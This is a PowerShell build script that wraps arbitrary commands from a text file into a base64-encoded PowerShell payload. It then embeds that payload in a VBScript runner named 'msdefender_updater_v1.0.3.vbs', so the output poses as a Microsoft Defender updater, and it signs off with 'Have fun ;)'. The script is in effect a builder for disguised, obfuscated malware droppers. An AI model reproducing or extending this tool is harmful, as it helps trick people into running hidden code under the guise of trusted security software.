$output_filename = "msdefender_updater_v1.0.3.vbs"

function Generate-Script {
    param (
        [string]$GeneratorPath,   # Path to the generator script or content file
        [string]$TemplatePath,    # Path to the template file
        [string]$OutputPath       # Path to save the generated output
    )

    # Get the content from the generator (execute if it's a script or read as raw text)
    $generatedContent = if (Test-Path $GeneratorPath) {
        if ($GeneratorPath -like "*.ps1") {
            & $GeneratorPath
        } else {
            Get-Content -Path $GeneratorPath -Raw
        }
    } else {
        Write-Error "Generator file not found: $GeneratorPath"
        return
    }

    # Read the template content
    if (Test-Path $TemplatePath) {
        $templateContent = Get-Content -Path $TemplatePath -Raw
    } else {
        Write-Error "Template file not found: $TemplatePath"
        return
    }

    # Replace placeholder with generated content
    $finalScript = $templateContent -replace "{{PLACEHOLDER}}", $generatedContent

    # Write the final script to the output path
    Set-Content -Path $OutputPath -Value $finalScript
}

Generate-Script -GeneratorPath ".\do_this.txt" `
                -TemplatePath ".\src\powershell_command_template.ps1" `
                -OutputPath ".\src\powershell_command.ps1"

Generate-Script -GeneratorPath ".\src\b64_powershell_wrapper.ps1" `
                -TemplatePath ".\src\b64_command_runner_template.vbs" `
                -OutputPath $output_filename

# Cleanup: Delete the generated PowerShell script after use
if (Test-Path ".\src\powershell_command.ps1") {
    #Remove-Item -Path ".\src\powershell_command.ps1" -Force
}

Write-Host "Have fun ;)"
